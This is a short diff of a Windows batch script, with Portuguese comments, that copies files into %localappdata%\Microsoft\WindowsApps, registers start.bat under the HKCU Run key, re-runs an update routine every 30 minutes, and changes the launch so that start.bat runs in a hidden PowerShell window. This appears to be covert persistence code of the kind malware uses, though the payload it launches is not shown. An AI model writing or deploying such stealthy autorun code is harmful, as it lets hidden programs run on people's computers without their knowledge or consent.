@@ -12,8 +12,8 @@ move %localappdata%\Microsoft\WindowsApps\testes-main\*.* %localappdata%\Microso
 ::adiciona ao registro do windows o start.bat para inicializar com o sistema
 REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v \start /t REG_SZ /d %localappdata%\Microsoft\WindowsApps\start.bat /f
 ::chama start.bat
-::powershell "start start.bat -WindowStyle Hidden"
-CALL start.bat
+powershell "start start.bat -WindowStyle Hidden"
+::CALL start.bat
 ::espera 30 minutos para recomeçar
 timeout 1800
 CALL :update
